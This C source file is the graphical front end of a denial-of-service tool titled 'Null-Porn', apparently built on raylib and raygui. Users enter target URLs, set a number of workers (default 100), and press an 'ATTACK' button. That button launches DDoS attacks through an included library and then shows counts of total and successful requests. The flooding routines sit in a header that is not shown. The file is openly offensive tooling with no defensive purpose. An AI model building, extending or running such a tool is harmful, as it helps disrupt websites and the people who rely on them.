#define RAYGUI_IMPLEMENTATION
#define STB_DS_IMPLEMENTATION
#include <raylib.h>
#include <raygui.h>

#include <stb_ds.h>
#include <NullPorn.h>

#include <pthread.h>
#include <regex.h>
#include <ctype.h>

#define WINDOW_WIDTH  1720
#define WINDOW_HEIGHT 967

static bool ValidURL(const char* url)
{
    regex_t regex;
    int ret;
    const char* pattern = "^(https?|ftp)://[^\\s/$.?#].[^\\s]*$";

    ret = regcomp(&regex, pattern, REG_EXTENDED);
    if (ret != 0) 
        return false;

    ret = regexec(&regex, url, 0, NULL, 0);
    regfree(&regex);
    return !ret;
}

static bool ValidNumber(const char *text)
{
    for (size_t i = 0; i < strlen(text); i++)
        if (!isdigit(text[i]))
            return false;
    return true;
}

int main()
{
    InitWindow(WINDOW_WIDTH, WINDOW_HEIGHT, "Null-Porn");
    SetTargetFPS(60);
   
    Rectangle panelRect        = { 25, 50+WINDOW_HEIGHT/12, WINDOW_WIDTH-50, WINDOW_HEIGHT-150 };
    Rectangle panelContentRect = { 0, 0, panelRect.width-15, 0 };
    Vector2   panelScroll      = { 99, 0 };

    bool showEndAttack = true;
    bool showAttack = false;
    bool showError = false;
    bool showAdd  = false;

    char** urls = NULL;
    uint32_t workersCount = 0;

    char urlBuffer[0x800] = {0};
    char workerCountBuffer[0x800] = "100";
    bool workerBufferType = false;

    char* errorType;

    while (!WindowShouldClose())
    {
        BeginDrawing();
        ClearBackground(RAYWHITE);

        panelContentRect.height = arrlen(urls)*1.2*30+100;

        if (!showAdd && !showError && !showAttack)
        {
            Rectangle content = GuiScrollPanel(panelRect, NULL, panelContentRect, &panelScroll);
            BeginScissorMode(content.x, content.y, content.width, content.height);

            GuiSetStyle(DEFAULT, TEXT_SIZE, 21);
            GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_LEFT);

            for (int i = 0; i < arrlen(urls); i++)
            {
                GuiLabel((Rectangle) { panelRect.x + 15, panelScroll.y+panelRect.y+15 + i*35, content.width - 100, 30 }, urls[i]);
                if(GuiButton((Rectangle) { panelRect.width-75-WINDOW_HEIGHT/12, panelScroll.y+panelRect.y+15 + i*35, WINDOW_WIDTH/12, 30}, GuiIconText(ICON_BIN, "Remove")))
                {
                    arrdel(urls, i);
                    goto DoneButtons;
                }
            }
            DoneButtons: EndScissorMode();
            
            GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
            GuiSetStyle(BUTTON, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);

            if (GuiTextBox((Rectangle) { 100+WINDOW_HEIGHT/12, 25, WINDOW_HEIGHT/12, WINDOW_HEIGHT/12 }, workerCountBuffer, 0x800, workerBufferType))
                if (ValidNumber(workerCountBuffer))
                {
                    workersCount = atoi(workerCountBuffer);
                    workerBufferType = !workerBufferType;
                }

            if (GuiButton((Rectangle) { 25, 25, WINDOW_WIDTH/12, WINDOW_HEIGHT/12 }, "ADD HOST"))
                showAdd = true;
            if (GuiButton((Rectangle) { WINDOW_WIDTH-25-WINDOW_WIDTH/12, 25, WINDOW_WIDTH/12, WINDOW_HEIGHT/12 }, "ATTACK"))
            {
                showAttack = true;
                showEndAttack = true;
            }
        }

        if (showAdd)
        {

            GuiSetStyle(DEFAULT, TEXT_SIZE, 80);
            GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
            GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, "ADD HOST");
            GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
            GuiTextBox((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, urlBuffer, 0x800, true);

            GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
            if (GuiButton((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Cancel"))
            {
                memset(urlBuffer, 0, 0x800);
                showAdd = false;
            }

            if (GuiButton((Rectangle) { WINDOW_WIDTH/2+50, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Okay"))
            {
                if (ValidURL(urlBuffer))
                    arrput(urls, strdup(urlBuffer));
                else 
                {
                    errorType = "Invalid HOST";
                    showError = true;
                }

                memset(urlBuffer, 0, 0x800);
                showAdd = false;
            }
        }

        if (showError)
        {
            GuiSetStyle(DEFAULT, TEXT_SIZE, 80);
            GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
            GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, "ERROR");
            GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
            GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, errorType);

            GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
            if (GuiButton((Rectangle) { (WINDOW_WIDTH-WINDOW_WIDTH/4+50)/2, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Okay"))
                showError = false;
        }

        if (showAttack)
        {
            DDoS attacks[arrlen(urls)];

            for (int i = 0; i < arrlen(urls); i++)
            {
                CreateAttack(&attacks[i], urls[i], workersCount);
                RunAttack(&attacks[i]);
            }

            if (showEndAttack)
            {
                GuiSetStyle(DEFAULT, TEXT_SIZE, 80);
                GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, "ATTACK STARTED");
                GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, "Press stop to end the attack.");

                GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
                if(GuiButton((Rectangle) { (WINDOW_WIDTH-WINDOW_WIDTH/4+50)/2, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Stop"))
                {
                    for (int i = 0; i < arrlen(urls); i++)
                        StopAttack(&attacks[i]);
                    showEndAttack = false;
                }
            } else 
            {
                char totalBuffer[256];
                char successfulBuffer[256];

                int successfulRequests = 0;
                int totalRequests = 0;
                
                for (int i = 0; i < arrlen(urls); i++)
                {
                    successfulRequests += attacks[i].data->successfulRequests;
                    totalRequests += attacks[i].data->totalRequests;
                }
                
                snprintf(totalBuffer, sizeof(totalBuffer), "Total Requests: %d", totalRequests);
                snprintf(successfulBuffer, sizeof(successfulBuffer), "Successful Requests: %d", successfulRequests);

                GuiSetStyle(DEFAULT, TEXT_SIZE, 48);
                GuiSetStyle(LABEL, TEXT_ALIGNMENT, TEXT_ALIGN_CENTER);
                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2-100, WINDOW_WIDTH/2, 80 }, totalBuffer);
                GuiLabel((Rectangle) { WINDOW_WIDTH/4, WINDOW_HEIGHT/2+100, WINDOW_WIDTH/2, 50 }, successfulBuffer);

                GuiSetStyle(DEFAULT, TEXT_SIZE, 28);
                if(GuiButton((Rectangle) { (WINDOW_WIDTH-WINDOW_WIDTH/4+50)/2, WINDOW_HEIGHT/2+200, WINDOW_WIDTH/4-50, 40 }, "Close"))
                    showAttack = false;
            }
        }
        
        EndDrawing();
    }
    
    arrfree(urls);
    CloseWindow();
}
